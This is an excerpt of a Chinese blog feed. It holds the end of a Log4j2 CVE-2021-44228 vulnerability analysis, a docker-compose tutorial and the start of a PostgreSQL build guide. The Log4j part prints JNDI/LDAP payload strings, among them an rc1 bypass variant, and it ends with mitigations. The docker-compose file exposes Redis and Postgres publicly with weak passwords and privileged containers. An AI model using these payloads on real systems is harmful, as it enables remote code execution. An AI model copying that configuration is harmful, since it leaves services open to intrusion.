src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212204456203.png"></div></div><p>然后来到MessagePatternConverter这个类的format方法。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212203304968.png"></div></div><p>可以看到上图红色方框里面的代码，当判断你打印的格式为 ${ 开头就进入replace的这个方法来进行替换，依次进入replace方法-&gt;substitute-&gt;substitute，发现有个resolveVariable的方法处理了变量。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212205152914.png"></div></div><p>进入resolveVariable方法，发现最后执行了resolver.lookup()的方法，resolver的实现是Interpolator这个类。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212205628288.png"></div></div><p>进入Interpolator，他通过对poc里面jndi:ldap://127.0.0.1:1389/Exploit获取第一个冒号之前的作为key来map中获取对应的LookUp，可以看到map中又这么多类型的LookUp，这里利用的是jndi的JndiLookUp这个类。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212205803131.png"></div></div><p>JndiLookUp中又有个JndiManager，又调用了JndiManager的lookUp方法</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212210543842.png"></div></div><p>然后他会调用到LdapCtx的c_lookup方法获取到一个LdapResult对象。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212211703694.png"></div></div><p>然后调用DirectoryManager.getObjectInstance，这var3是个Reference类型。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212211934271.png"></div></div><p>在进入就是getObjectFactoryFromReference方法，这里面有class.forName()，然后就加载了类，同时也执行了命令。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212212302770.png"></div></div><p>最终的地方</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212212545968.png"></div></div><p>整体下来有个疑惑的点，就是不知他通过ldap调过来的class文件放哪了，还需要深入学习，有师傅知道的话，感谢能够告知。</p><p>至此2.x到2.14.1版本的log4j漏洞复现完毕，接下来看log4j的<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">log4j-2.15.0-rc1</a>版本的绕过。</p><p>我开始clone log4j的源代码，并切换到log4j-2.15.0-rc1版本，发现大体上有两处的改动，第一处是前面有说过的MessagePatternConverter这个实现类，apache官方将这个类添加了四个内部实现类，并且将format这个方法在子类里面进行了实现，如下图所示。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212213347905.png"></div></div><p>format方法如下</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212213450327.png"></div></div><p>会发现四个实现类里面有个LookupMessagePatternConverter的类就是利用点，如下图所示。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212214048786.png"></div></div><p>但是发现根本到不了这个LookupMessagePatternConverter类，默认去的是SimpleMessagePatternConverter。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212214835473.png"></div></div><p>我们想要的是进入LookupMessagePatternConverter这个类，所以我看了一下这个formatters的数据由来，发现他通过分析日志的pattern格式（如：%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n ）来选择PatternConverter，比如发现有%d{HH:mm:ss.SSS}就会通过反射来创建一个DatePatternConverter类，所以我这里就想要通过配置文件来让反射出我想要的类，于是配置的xml文件如下，主要添加的就是%msg后面的{lookups}这个。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!-- 具体就是%msg后面的&#123;lookups&#125;这个会使后续的代码反射出LookupMessagePatternConverter --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg&#123;lookups&#125;%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>具体的解析代码如下，有兴趣可以自己去阅读一下源码：</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212220626668.png"></div></div><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212221347525.png"></div></div><p>满足如下条件既生成想要的类，也就是lookups这个为true，也就是loadLookups(options)这个方法里面当传入的options里面含有lookups字符串的时候返回true。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212221610108.png"></div></div><p>生成LookupMessagePatternConverter最终的调用链如下：</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212221945700.png"></div></div><p>到此我们又成功用到了这个针对${}的解析，但是在进入JndiManager这个类的lookup里面发现前面加了很多东西，最终poc在下面红色框框的里面由于attributeMap中存在javaFactory这个key，导致直接return null，失败。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212222510834.png"></div></div><p>然后我看了一下<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">log4j-2.15.0-rc2</a>的修改，发现了一个点，他在代码提交中添加了如下代码，那就反向思维一下，log4j-2.15.0-rc1里面没有返回null，那我们只要让上面的new URI()这个方法爆出URISyntaxException这个异常并且不影响后面的使用就行，异常被捕获但是并未处理导致了这个绕过。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212222826484.png"></div></div><p>于是在原来的payload上面添加特殊字符绕过，poc如下logger.error(“${jndi:ldap://127.0.0.1:1389/Exploit/ }”);</p><p>到此结束，具体的利用过程就不发出来了，目前官方已经发布了2.15.0版本，大家及时更新。</p><p>全部调用链如下：</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211212223757355.png"></div></div><h4 id="poc测试代码地址：https-github-com-fireflyingup-log4j-poc"><a href="#poc测试代码地址：https-github-com-fireflyingup-log4j-poc" class="headerlink" title="poc测试代码地址：https://github.com/fireflyingup/log4j-poc"></a>poc测试代码地址：<a href="https://github.com/fireflyingup/log4j-poc">https://github.com/fireflyingup/log4j-poc</a></h4><h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a><strong>安全建议</strong></h3><p>1、排查应用是否引入了Apache log4j-core Jar包，若存在依赖引入，且在受影响版本范围内，则可能存在漏洞影响。请尽快升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0 版本，地址 <a href="https://logging.apache.org/log4j/2.x/download.html">https://logging.apache.org/log4j/2.x/download.html</a></p><p>2、升级已知受影响的应用及组件，如 spring-boot-starter-log4j2/Apache Struts2/Apache Solr/Apache Druid/Apache Flink</p><p>3、临时缓解方案。可升级jdk版本至6u211 / 7u201 / 8u191 / 11.0.1以上，可以在一定程度上限制JNDI等漏洞利用方式。对于大于2.10版本的Log4j，可设置 log4j2.formatMsgNoLookups 为 True，或者将 JndiLookup 类从 classpath 中去除，例如 zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</p><p>希望大家守好安全不要做坏事。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/10649#toc-3">https://xz.aliyun.com/t/10649#toc-3</a></p><p><a href="https://help.aliyun.com/noticelist/articleid/1060971232.html">https://help.aliyun.com/noticelist/articleid/1060971232.html</a></p><p><a href="https://logging.apache.org/log4j/2.x/">https://logging.apache.org/log4j/2.x/</a></p><p><a href="https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce">https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;log4j 2是apache官方出品的日志框架，是对log4j的一个升级，目前在很多厂商的java项目中被广泛使用，影响力广泛，在2021年</summary>
      
    
    
    
    <category term="漏洞分析" scheme="http://fireflyingup.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="漏洞分析" scheme="http://fireflyingup.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>记一次docker-compose的使用</title>
    <link href="http://fireflyingup.github.io/2021/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1docker-compose%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://fireflyingup.github.io/2021/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1docker-compose%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2021-10-28T16:41:19.000Z</published>
    <updated>2023-12-19T01:34:06.376Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么是docker-compose"><a href="#什么是docker-compose" class="headerlink" title="什么是docker-compose?"></a>什么是docker-compose?</h3><p>英文解释：</p><p>Docker Compose is a tool for running multi-container applications on Docker defined using the <a href="https://compose-spec.io/">Compose file format</a>. A Compose file is used to define how the one or more containers that make up your application are configured. Once you have a Compose file, you can create and start your application with a single command: <code>docker compose up</code>.</p><p>也就是说docker-compose是一个工具，通过一个定义的compose文件格式来运行docker上的多容器应用程序，Compose 文件用于定义构成应用程序的一个或多个容器的配置方式，可以通过docker-compose up来启动docker应用程序，所以说docker-compose是一个很好的docker管理docker的东西，下面讲一次docker-compose的一次使用。</p><h3 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h3><p>这里将要搭建一个常用的项目架构，使用的环境如下</p><ul><li>nginx:1.18.0</li><li>jdk:1.8</li><li>postgresql:10.4</li><li>redis:5.0.13</li></ul><p>这是一个最基础的项目情况，首先流量进入nginx，nginx做反向代理把流量转发给我们的项目（这里取名叫做fire），然后fire可以访问pgsql和redis。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h5 id="安装docker，命令如下"><a href="#安装docker，命令如下" class="headerlink" title="安装docker，命令如下"></a>安装docker，命令如下</h5><p>通过yum安装docker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install docker</span><br></pre></td></tr></table></figure><p>使用service服务运行docker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p>判断docker是否启动成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker -v</span><br><span class="line"><span class="comment"># 出现下面信息 </span></span><br><span class="line"><span class="comment"># Docker version 1.13.1, build 7d71120/1.13.1</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">docker ps </span><br><span class="line"><span class="comment"># 出现</span></span><br><span class="line"><span class="comment"># CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span></span><br></pre></td></tr></table></figure><h5 id="安装docker-compose工具"><a href="#安装docker-compose工具" class="headerlink" title="安装docker-compose工具"></a>安装docker-compose工具</h5><p>去<a href="https://github.com/docker/compose/tags">docker-compose的github</a>上下载对应的tag，这里我们选择v2.0.1</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1docker-compose%E7%9A%84%E4%BD%BF%E7%94%A8/image-20211029011704887.png"></div></div><p>点进去选择自己对应的服务器或者电脑版本下载，这里我是linux-x86_64的。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1docker-compose%E7%9A%84%E4%BD%BF%E7%94%A8/image-20211029011917528.png"></div></div><p>下载完之后会发现下下来的直接就可以使用，我们修改一下名字，并放入/usr/bin/目录下，这样就可以直接使用命令了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv docker-compose-linux-x86_64 docker-compose <span class="comment"># 修改名字，这里下下来的是直接可以用的，已经编译好了</span></span><br><span class="line">mv docker-compose /usr/bin/ <span class="comment"># 将docker-compose移到/usr/bin目录下</span></span><br><span class="line">docker-compose -v <span class="comment"># 测试一下，出现Docker Compose version v2.0.1即为成功</span></span><br></pre></td></tr></table></figure><h3 id="docker-compose-yml文件编写"><a href="#docker-compose-yml文件编写" class="headerlink" title="docker-compose.yml文件编写"></a>docker-compose.yml文件编写</h3><p>文件如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span> <span class="comment">#版本</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.io/redis:5.0.13</span> <span class="comment"># 镜像名称，不知道可以docker search redis搜索一下，然后填入版本号可以去官方仓库查看，地址：https://hub.docker.com/search?q=java&amp;type=image</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span> <span class="comment"># 这里很重要，因为我项目是部署在非root用户下面，所以在我运行的时候一直报权限不足，加了这个就好了</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis</span> <span class="comment"># 容器名称</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span> <span class="comment"># 每次重启自动启动</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span> <span class="comment"># 使用上海时区</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;HOME&#125;/data/redis:/data</span> <span class="comment"># 挂载映射，冒号前面的是你服务器的路径，后面的是docker容器里面的路径，两边做了一个映射</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:6379:6379</span> <span class="comment"># 端口映射，将本机的6379端口和docker容器的6379端口做了映射，0.0.0.0表示端口对外开放，服务器外可以访问。</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">redis-server</span> <span class="string">--requirepass</span> <span class="number">123456</span> <span class="comment"># 执行的命令，--requirepass 设置密码为123456</span></span><br><span class="line">  <span class="attr">postgres:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.io/postgres:10.4</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">postgres</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_DB=sca</span> <span class="comment"># 设置pgsql的数据库名称</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_USER=sca</span> <span class="comment"># 设置pgsql的用户名，他有一个默认用户postgres</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">POSTGRES_PASSWORD=sca</span> <span class="comment"># 设置pgsql的密码</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:5432:5432</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;HOME&#125;/data/postgresql:/var/lib/postgresql/data</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.io/nginx:1.18.0</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;HOME&#125;/config/nginx/conf/nginx.conf:/etc/nginx/nginx.conf</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;HOME&#125;/app/html:/usr/share/nginx/html</span> <span class="comment"># 前端的静态文件存放在服务器的$&#123;HOME&#125;/app/html下，会自动映射进docker里面的/usr/share/nginx/html</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:80:80</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">fire</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">fire</span> <span class="comment"># 表示依赖于fire这个项目</span></span><br><span class="line">  <span class="attr">fire:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">openjdk:8-jdk-alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">fire</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:8081:8081</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;HOME&#125;/app/fire-service.jar:/app/fire-service.jar</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">java</span> <span class="string">-jar</span> <span class="string">-Dspring.profiles.active=dev</span> <span class="string">/app/fire-service.jar</span> <span class="comment"># -Dspring.profiles.active=dev指定dev环境运行</span></span><br><span class="line">    <span class="attr">links:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">postgres</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">postgres</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span> <span class="comment"># 表示依赖于postgresql和redis</span></span><br></pre></td></tr></table></figure><p>这里有几个地方要说一下</p><p>第一个是privileged: true，这里是由于我是非root用户使用docker-compose的，所以他在docker容器里面使用路径的话会出现权限不够的情况，使用这个就解决了这个问题，但是有一个其他的问题就是在服务器映射创建出来的文件变成了root权限，这个还有待优化去解决。</p><p>第二个是我后面出现了一个问题，问题如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fire       | Error: Invalid or corrupt jarfile /app/fire-service.jar</span><br></pre></td></tr></table></figure><p>这个问题出现有很多种情况，比如你映射的docker容器里面的路径和你启动命令的路径不对，也就是volumns冒号后面的路径和你command里面java -jar启动的路径不对。</p><p>在这里我是一种特殊的情况，是因为我使用的是非root用户，而且我的volumes里面使用了${HOME}，所以外面被映射到了/root目录下，而不是我的/home/myName目录下，排查这个问题的心理路程如下。</p><p>首先我猜想是不是我的docker-compose.yml文件有没有错误，在我仔细万分的肉眼识别之下，我确定是没有问题的，那么排查我文件的错误。</p><p>然后我在确定我docker-compose.yml文件下的映射没问题的情况下，我想查看我容器里面的包是否正确，但是容器无法启动，我无法通过 docker exec -it 容器名 bash 命令进入我的容器，所以我得想办法进入我的容器或者输出我这个容器的映射文件，于是我构造了以下command。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span>: ls -l /app &amp; java -jar -Dspring.profiles.active=dev /app/fire-service.jar <span class="comment"># 主要目的是打印出fire-service.jar文件的大小，看看是不是文件损坏或者其他原因</span></span><br></pre></td></tr></table></figure><p>结果发现了如下打印</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fire       | total 0</span><br><span class="line">fire       | drwxr-xr-x    2 root     root             6 Oct 28 22:06 fire-service.jar</span><br></pre></td></tr></table></figure><p>看见这个文件的大小只有6B，明显不对，我在仔细看我的docker-compose文件，发现了问题点，原来我是root用户启动的docker-compose up命令，导致${HOME}取了/root的值，后来su myName切换到普通用户，就成功了</p><p>最终docker ps发现项目全部启动</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1docker-compose%E7%9A%84%E4%BD%BF%E7%94%A8/image-20211029015838506.png"></div></div><p>最后说一下docker-compose的常用命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up <span class="comment"># 启动</span></span><br><span class="line">docker-compose up -d <span class="comment"># 后台启动</span></span><br><span class="line">docker-compose down <span class="comment"># 关闭</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;什么是docker-compose&quot;&gt;&lt;a href=&quot;#什么是docker-compose&quot; class=&quot;headerlink&quot; title=&quot;什么是docker-compose?&quot;&gt;&lt;/a&gt;什么是docker-compose?&lt;/h3&gt;&lt;p&gt;英文解释：&lt;/p</summary>
      
    
    
    
    <category term="docker" scheme="http://fireflyingup.github.io/categories/docker/"/>
    
    
    <category term="docker-compose" scheme="http://fireflyingup.github.io/tags/docker-compose/"/>
    
  </entry>
  
  <entry>
    <title>Linux源码编译安装PostgreSql</title>
    <link href="http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85PostgreSql/"/>
    <id>http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85PostgreSql/</id>
    <published>2021-09-23T16:44:28.000Z</published>
    <updated>2023-12-19T01:39:25.170Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1、下载postgresql"><a href="#1、下载postgresql" class="headerlink" title="1、下载postgresql"></a>1、下载postgresql</h4><p>百度或者谷歌搜索postgresql download</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85PostgreSql/image-20210924165355347.png"></div></div><p>点进去就是postgresql的官方下载页面，页面如下</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85PostgreSql/image-20210924165711106.png"></div></div><p>如果你知道你自己的系统是什么，那么你就去上面蓝色框中选择自己系统对应的来进行下载，当然不知道的话，比如说你是arm的系统，这时候就要在自己的系统上使用源码编译，不然是无法使用的，这里就是要进行源码编译，所以我们选择Source code下面的file browser，也就是上图中的红色框。</p><p>点进去可以看到有很多postgresql的版本，这里我们选择10.4版本进行安装。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85PostgreSql/image-20210924170316426.png"></div></div><p>点击v10.4进去下载对应的压缩文件</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85PostgreSql/image-20210924170447245.png"></div></div><p>当然也可以使用wget命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://ftp.postgresql.org/pub/<span class="built_in">source</span>/v10.4/postgresql-10.4.tar.gz <span class="comment">#下载</span></span><br><span class="line">tar -zxvf postgresql-10.4.tar.gz <span class="comment">#解压</span></span><br></pre></td></tr></table></figure><h4 id="2、编译安装postgresql"><a href="#2、编译安装postgresql" class="headerlink" title="2、编译安装postgresql"></a>2、编译安装postgresql</h4><p>在编译之前我们要先对编译所需要的环境进行安装</p><p>安装readline</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install readline-devel <span class="comment">#yum安装</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">sudo apt-get install libreadline6-dev</span><br></pre></td></tr></table></figure><p>不安装可能会出现如下错误</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85PostgreSql/image-20210924173402260.png"></div></div><p>安装zlib</p><figure class="highlight sh"><table><tr><td 